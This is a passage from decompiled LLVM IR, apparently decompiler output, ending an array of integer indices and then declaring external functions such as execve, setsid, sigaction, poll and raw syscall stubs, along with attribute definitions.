1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 43, 1326, 1327, 1328, 1329, 1330, 1331, 217, 218, 219, 220, 1306, 1308, 1307, 1309, 1310, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1494, 44, 1495, 1496, 1497, 1498, 74, 45, 61, 75, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 4, 1519, 1687, 1688, 1689, 1690, 1691, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 46, 1096, 47, 1097, 1098, 1099, 1100, 1101, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 712, 713, 714, 715, 1153, 1154, 1155, 678, 679, 680, 681, 682, 683, 684, 1102, 1103, 1104, 1105, 1106, 1566, 1567, 1568, 897, 898, 899, 1131, 1132, 1635, 1636, 1637, 1638, 659, 660, 812, 1111, 1112, 1569, 1570, 648, 649, 650, 567, 568, 569, 570, 571, 572, 560, 561, 562, 651, 652, 653, 972, 973, 974, 496, 501, 497, 498, 499, 500, 502, 508, 503, 504, 505, 506, 507, 1032, 1033, 813, 814, 509, 1659, 1660, 1661, 1571, 1572, 1573, 1542, 1543, 1544, 510, 511, 687, 688, 689, 528, 529, 530, 531, 1241, 1242, 1639, 1640, 1641, 1682, 1683, 1684, 1217, 1218, 1219, 815, 816, 718, 719, 1171, 1172, 1672, 1673, 512, 513, 1138, 1139, 1235, 1236, 1237, 1574, 1521, 1663, 1664, 1665, 1666, 1412, 1413, 1414, 605, 817, 818, 819, 820, 1522, 1523, 1524, 76, 77, 514, 515, 516, 63, 517, 518, 519, 520, 521, 522, 523, 48, 524, 525, 526, 1575, 1576, 49, 1577, 64, 1578, 1579, 527, 532, 533, 534, 535, 538, 539, 536, 537, 221, 222, 223, 224, 1445, 1446, 1449, 1450, 1642, 1643, 1647, 1648, 1649, 1658, 540, 541, 542, 543, 544, 1506, 1507, 1508, 1511, 1512, 1513, 1516, 1517, 1518, 1580, 51, 1621, 50, 1626, 1627, 1628, 1509, 1510, 1514, 1515, 545, 546, 1585, 1586, 1587, 1588, 1589, 1590, 1591, 1592, 1593, 1594, 1598, 1599, 225, 226, 227, 228, 1581, 1582, 52, 1583, 1584, 547, 548, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1460, 1465, 549, 550, 553, 554, 555, 229, 230, 231, 232, 1439, 1440, 1441, 1442, 1443, 1444, 1461, 1462, 53, 1463, 1464, 551, 552, 1459, 556, 557, 558, 559, 1600, 1601, 1602, 1537, 1538, 1539, 54, 1540, 1541, 1447, 1448, 1563, 1564, 1595, 1596, 1597, 563, 564, 565, 566, 573, 574, 575, 576, 577, 578, 579, 233, 234, 235, 821, 55, 822, 823, 824, 837, 825, 826, 827, 828, 829, 836, 830, 831, 832, 833, 834, 835, 580, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 581, 582, 583, 584, 585, 1650, 1651, 1652, 606, 607, 608, 1113, 1114, 1115, 1116, 745, 746, 747, 748, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 1603, 1604, 1605, 1606, 1607, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 908, 909, 910, 911, 262, 263, 264, 265, 708, 709, 710, 711, 1156, 1157, 1158, 1159, 1117, 1118, 1119, 1120, 1107, 1108, 1109, 1110, 1121, 1122, 1123, 1124, 266, 267, 268, 269, 270, 772, 773, 774, 775, 271, 272, 917, 918, 919, 920, 586, 587, 588, 1622, 1623, 1624, 1625, 1653, 1654, 1655, 1656, 1657, 1644, 1645, 1646, 1608, 1609, 1610, 1618, 1619, 1620, 1611, 1612, 1616, 1617, 1613, 56, 1614, 1615, 589, 1528, 1534, 1535, 1529, 1530, 1531, 1532, 1533, 590, 591, 592, 1525, 1526, 1527, 273, 274, 593, 594, 595, 596, 597, 598, 599, 600, 609, 612, 613, 615, 620, 275, 276, 277, 278, 621, 622, 623, 624, 616, 617, 57, 618, 619, 610, 611, 614, 625, 1148, 1149, 1150, 1151, 1152, 626, 627, 83, 84, 85, 86, 58, 87, 88, 89, 91, 92, 93, 94, 95, 96, 90, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 628, 629, 644, 645, 646, 647, 630, 639, 640, 631, 62, 632, 5, 633, 634, 635, 636, 637, 638, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 641, 642, 643, 654, 655, 656, 657, 658, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 676, 677, 685, 686, 716, 717, 720, 119, 120, 121, 122, 123, 124, 125, 126, 127, 129, 128, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 721, 722, 723, 724, 725, 726, 727, 728, 729, 739, 740, 741, 742, 743, 744, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 776, 777, 778, 779, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 912, 913, 914, 915, 916, 921, 922, 923, 924, 925, 926, 927, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @setrlimit(i32, %rlimit*) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @sigsuspend(%_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16* @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i64 @__decompiler_undefined_function_4() local_unnamed_addr

declare i8 @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %pollfd* @__decompiler_undefined_function_8() local_unnamed_addr

declare %rlimit* @__decompiler_undefined_function_9() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_10() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_11() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_12() local_unnamed_addr

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
